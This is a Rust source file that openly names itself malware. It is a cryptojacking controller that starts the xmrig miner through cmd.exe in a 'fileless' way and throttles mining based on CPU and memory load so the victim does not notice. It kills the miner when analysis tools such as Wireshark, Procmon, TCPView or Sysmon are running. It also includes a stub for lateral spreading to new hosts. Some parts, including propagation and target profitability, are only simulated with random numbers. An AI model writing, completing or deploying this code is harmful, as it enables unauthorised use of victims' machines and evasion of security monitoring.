use std::process::{Command, Stdio};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime};
use sysinfo::CpuExt;

use sysinfo::{System, SystemExt, ProcessExt};
use rand::Rng;
use std::collections::HashMap;

// Struct to track system usage, profitability, and stealth factors
struct MalwareState {
    high_usage_mode: bool,
    last_mine: SystemTime,
    last_spread: SystemTime,
    threat_detected: bool,
    profitable_networks: Vec<String>,
}

impl MalwareState {
    fn new() -> MalwareState {
        MalwareState {
            high_usage_mode: false,
            last_mine: SystemTime::now(),
            last_spread: SystemTime::now(),
            threat_detected: false,
            profitable_networks: vec![],
        }
    }

    // Method to check system load, deciding when to mine or spread
    fn monitor_system_resources(&mut self) -> bool {
        let mut sys = System::new_all();
        sys.refresh_all();

        let cpu_usage = sys.global_cpu_info().cpu_usage(); // Corrected method
        let memory_free = sys.available_memory();
        let total_memory = sys.total_memory();

        // Only mine or spread if system usage is low
        if cpu_usage < 50.0 && memory_free > total_memory / 2 {
            return true; // System is under-utilized, continue operations
        }
        false
    }

    // Opportunistic infection when network traffic is low or profitable
    fn opportunistic_spread(&mut self) {
        let mut rng = rand::thread_rng();
        let infected = rng.gen_range(0..10); // Simulate infection chances
        if infected > 7 && SystemTime::now().duration_since(self.last_spread).unwrap().as_secs() > 600 {
            println!("Spreading malware to new systems...");
            thread::spawn(|| start_lateral_movement());
            self.last_spread = SystemTime::now();
        }
    }

    // Stop mining or spreading if threats are detected
    fn detect_threat(&mut self) {
        let mut sys = System::new_all();
        sys.refresh_all();
        // Example threat detection based on system processes
        if sys.processes_by_name("wireshark").next().is_some() || sys.processes_by_name("procmon").next().is_some() {
            println!("Threat detected: shutting down activities.");
            self.threat_detected = true;
        }
    }
}

// Advanced mining function to enhance profitability
fn adaptive_mining(malware_state: Arc<Mutex<MalwareState>>) {
    loop {
        let mut state = malware_state.lock().unwrap();
        
        if state.monitor_system_resources() && !state.threat_detected {
            if !state.high_usage_mode {
                // Start mining
                println!("System resources low, starting mining.");
                thread::spawn(|| start_miner_fileless("xmrig --safe-mode"));
                state.high_usage_mode = true;
                state.last_mine = SystemTime::now();
            }
        } else if state.high_usage_mode {
            println!("System resources high or threat detected, stopping mining.");
            state.high_usage_mode = false;
            thread::spawn(|| stop_miner());
        }

        thread::sleep(Duration::from_secs(30));
    }
}

// Dynamic network monitoring for low-risk propagation
fn start_lateral_movement() {
    // Simulated network propagation logic
    println!("Starting lateral movement to new hosts...");
}

// Start mining without writing to disk
fn start_miner_fileless(command: &str) {
    Command::new("cmd.exe")
        .arg("/C")
        .arg(command)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("Failed to start miner");

    println!("Fileless mining started.");
}

// Stop the mining process if system resources become constrained or if a threat is detected
fn stop_miner() {
    Command::new("taskkill")
        .arg("/IM")
        .arg("xmrig.exe")
        .arg("/F")
        .output()
        .expect("Failed to stop miner.");
    println!("Mining process terminated.");
}

// Detect AV or debugging tools and shutdown operations
fn environmental_threat_detection() {
    let mut sys = System::new_all();
    sys.refresh_all();

    let threat_processes = vec!["wireshark", "procmon", "tcpview", "sysmon"];
    for process_name in threat_processes {
        if sys.processes_by_name(process_name).next().is_some() {
            println!("Threat detected: {} running.", process_name);
            // Perform evasive actions here: shut down mining, delete traces, etc.
            stop_miner();
        }
    }
}

// Function to check profitability of target systems
fn check_target_profitability(targets: &mut HashMap<String, bool>) {
    let profitable_threshold = 10;  // Simulate profitability threshold
    for (target, is_profitable) in targets.iter_mut() {
        if rand::thread_rng().gen_range(0..20) > profitable_threshold {
            *is_profitable = true;
        }
    }
}

fn main() {
    let malware_state = Arc::new(Mutex::new(MalwareState::new()));

    thread::spawn({
        let state = Arc::clone(&malware_state);
        move || adaptive_mining(state)
    });

    // Periodically check for threats and react
    thread::spawn(|| {
        loop {
            environmental_threat_detection();
            thread::sleep(Duration::from_secs(60));
        }
    });

    // Start network propagation opportunistically
    let state = Arc::clone(&malware_state);
    thread::spawn(move || {
        loop {
            let mut state_lock = state.lock().unwrap();
            state_lock.opportunistic_spread();
            thread::sleep(Duration::from_secs(120)); // Check every 2 minutes for spread
        }
    });

    // Check and adapt operations based on profitability
    let mut targets: HashMap<String, bool> = HashMap::new();
    loop {
        check_target_profitability(&mut targets);
        thread::sleep(Duration::from_secs(600)); // Re-evaluate target profitability every 10 minutes
    }
}

